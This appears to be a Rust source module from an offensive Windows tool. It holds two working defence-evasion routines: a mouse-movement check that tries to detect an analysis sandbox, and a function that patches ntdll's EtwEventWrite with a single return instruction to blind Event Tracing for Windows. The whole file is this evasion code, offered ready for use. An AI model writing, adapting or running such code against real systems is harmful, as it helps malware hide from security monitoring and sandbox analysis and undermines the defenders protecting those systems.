use crate::error::AppError;
use core::ffi::c_void;
use enigo::Enigo; 
use colored::Colorize;
use windows::core::PCSTR;
use windows::Win32::Foundation::HINSTANCE;
use windows::Win32::Foundation::GetLastError;
use windows::Win32::System::Memory::VirtualProtect;
use windows::Win32::System::LibraryLoader::LoadLibraryA;
use windows::Win32::System::LibraryLoader::GetProcAddress;
use windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE;
use windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS;

// Check for mouse pointer activity
pub fn __check_mouse_pointer()->bool {
    println!("[i] Checking User Cursor Activity");
    // Check initial location
    let initial_cursor_location: (i32, i32) = Enigo::mouse_location();
    let ix = initial_cursor_location.0;
    let iy = initial_cursor_location.1;
    println!("[i] Inital Postion: {:?}", initial_cursor_location);

    // Sleep for 10s
    let duration = std::time::Duration::new(10,0);
    std::thread::sleep(duration);

    // Check  final location
    let final_cursor_location: (i32, i32) = Enigo::mouse_location();
    let fx = final_cursor_location.0;
    let fy = final_cursor_location.1;
    println!("[i] Final Position: {:?}", final_cursor_location);

    if ix == fx || iy == fy || (fy-iy) == (fx-ix) {
        eprintln!("[!] Sandbox Environment Suspected");
        return false;
    }
    true
}

pub fn patch_etw()->Result<(), AppError> {
    // Get Event Consumer from: https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
    // Note: add the following line to the Consumer code: 
    // #pragma comment (lib, "advapi32")
    let lplibfilename: PCSTR = PCSTR(b"ntdll.dll\0"[..].as_ptr() as *const u8);
    let hmodule: HINSTANCE = unsafe {
        match LoadLibraryA(lplibfilename) {
            Ok(val) => {
                if val.0 == 0 as isize {
                    return Err(AppError{description: String::from("LoadLibraryA() returned an invalid handle")});    
                }
                val
            },
            Err(_e) => {
                let err_msg = format!("LoadLibraryA() Function failed with error: {:?}", GetLastError());
                return Err(AppError{description: err_msg});
            }
        }
    };

    let lpprocname: PCSTR = PCSTR(b"EtwEventWrite\0"[..].as_ptr() as *const u8);
    let proc_address = unsafe {
        match GetProcAddress(hmodule, lpprocname) {
            Some(val) => val,
            None => {
                let err_msg = format!("GetProcAddress() Function failed with error: {:?}", GetLastError());
                return Err(AppError{description: err_msg});
            }
        }
    };
    
    let oldprotect = 0;
    let addr_oldprotect: *const u8 = &oldprotect;
    let result = unsafe {
        VirtualProtect(
            proc_address as *const c_void,
            1 as usize,
            PAGE_EXECUTE_READWRITE,
            addr_oldprotect as *mut PAGE_PROTECTION_FLAGS
        ).as_bool()
    };

    if !result {
        unsafe {
            let err_msg = format!("VirtualProtect() failed with Errror: {:?}", GetLastError());
            return Err(AppError{description: err_msg});
        }
    }

    let ret_code: &[u8] = &[195];
    // Copy ret code 
    unsafe {
        let dst_ptr = proc_address as *mut u8;
        let src_ptr = ret_code.as_ptr() as *const u8;
        std::ptr::copy_nonoverlapping(src_ptr, dst_ptr, 1);
    }

    let oldoldprotect = 0;
    let addr_oldoldprotect: *const u8 = &oldoldprotect;
    let result = unsafe {
        VirtualProtect(
            proc_address as *const c_void,
            1 as usize,
            PAGE_PROTECTION_FLAGS(oldprotect.into()),
            addr_oldoldprotect as *mut PAGE_PROTECTION_FLAGS
        ).as_bool()
    };

    if !result {
        unsafe {
            let err_msg = format!("VirtualProtect() failed with Errror: {:?}", GetLastError());
            return Err(AppError{description: err_msg});
        }
    }

    Ok(())
}